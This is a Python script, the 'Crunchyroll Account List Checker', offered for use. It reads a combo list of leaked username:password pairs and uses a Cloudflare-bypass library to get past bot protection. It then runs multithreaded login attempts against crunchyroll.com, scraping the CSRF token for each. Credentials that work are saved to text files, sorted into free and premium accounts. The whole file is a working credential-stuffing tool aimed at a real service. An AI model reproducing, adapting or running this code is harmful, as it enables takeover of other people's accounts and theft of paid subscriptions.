#Copyright 2017 Joao Vitor B. F.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated 
# documentation files (the "Software"), to deal in the Software without restriction, including without limitation the 
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
# and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT 
# NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 
# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

from bs4 import BeautifulSoup
import requests
import argparse
import os
import sys
import threading
import time
import cfscrape

tLock = threading.Lock()

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
	
def check(name, threadid):
	while True:
		try:
			print(name+" thread is loading the Cloudflare bypass.")
			sess = cfscrape.create_scraper()
			loginpage=sess.get("https://www.crunchyroll.com/login")	
			phpsess=loginpage.cookies["PHPSESSID"]
			loginsoup = BeautifulSoup(loginpage.text, "html.parser")
			csrftok = loginsoup.find(id="login_form__token")["value"]
			headerz={"Host":"www.crunchyroll.com",
			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
			"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language":"en-US,en;q=0.5",
			"Accept-Encoding":"gzip, deflate, br",
			"Referer":"https://www.crunchyroll.com/login?next=%2F",
			"Upgrade-Insecure-Requests":"1"}
			print(name+" loaded the Cloudflare bypass. Starting thread.")

			global total
			total = sum(1 for line in open(arg.inputfile))
		except:
			continue
		break

	for line in combo:
		while True:
			try:
				if total!=0:
					global percentage
					global checked
					percentage = (checked/total)*100
				if checked >= total:
					exit()
				user, passw = line.split(":")
				user=user.strip()
				passw=passw.strip()
				
				sess.post("https://www.crunchyroll.com/login", data={"login_form[name]":user, "login_form[password]":passw, "login_form[redirect_url]":"/", "login_form[_token]":csrftok}, headers=headerz, cookies={"PHPSESSID":phpsess})
				testacc = sess.get("https://www.crunchyroll.com/acct/membership", headers=headerz, cookies={"PHPSESSID":phpsess, "c_locale":"enUS"})
				testsoup = BeautifulSoup(testacc.text, "html.parser")
				
				if testsoup.title.string.strip() == "Crunchyroll -   Account Management":
					global working
					working = working + 1
					try:
						if testsoup.find(class_="acct-membership-status").contents[1].contents[3].string.strip() == "Free":
							global free
							free = free + 1
							tLock.acquire()
							with open("justworking.txt", "a") as justworking:
								justworking.write(user+":"+passw+"\n")
								justworking.close
							tLock.release()
					except:
						global premium
						premium = premium + 1
						tLock.acquire()
						with open("workingandpremium.txt", "a") as workingandpremium:
							workingandpremium.write(user+":"+passw+"\n")
							workingandpremium.close
						tLock.release()
				checked = checked + 1
			except:
				continue
			break
		
if __name__=="__main__":

	class arg:
		pass
	argparser = argparse.ArgumentParser(description="Crunchyroll Account List Checker made by JoaoVitorBF.", usage="%(prog)s input_file", epilog="Version: 1.0")
	argparser.add_argument("inputfile", metavar="input_file", help="inputs a combo list text file to be used.")
	argparser.add_argument("threads", metavar="number_of_threads", help="specifies the number of threads to use (recommended max of 20).")
	argus = argparser.parse_args(namespace=arg)
	if os.path.isfile(arg.inputfile):
		print("File found, starting checker...")
	else:
		print("File \""+arg.inputfile+"\" does not exist. Please input an existing combo list text file.")
		exit()
	thread = []
	global combo
	combo = open(arg.inputfile, "r")
	global percentage, checked, free, premium, working, total
	percentage, checked, free, premium, working, total = 0, 0, 0, 0, 0, 99999999

	for i in range(int(arg.threads)):
		threadz = threading.Thread(target=check, args=("Thread "+str(i+1), i+1))
		thread.append(threadz)
		thread[i].start()
	while True:
		if checked >= total:
			print("Checking finished, "+str(working)+" working accounts, which "+str(premium)+" are premium.")
			print("Accounts saved to text files.")
			exit()
		cls()
		print("CrunchyrollChecker 1.2 by JoaoVitorBF\nTotal: "+str(total)+" | Checked: "+str(checked)+" | Working: "+str(working)+" | Free: "+str(free)+" | Premium: "+str(premium)+" | Completed: "+str(percentage)+"%")
		time.sleep(3)
		
#Thank you for using my script!
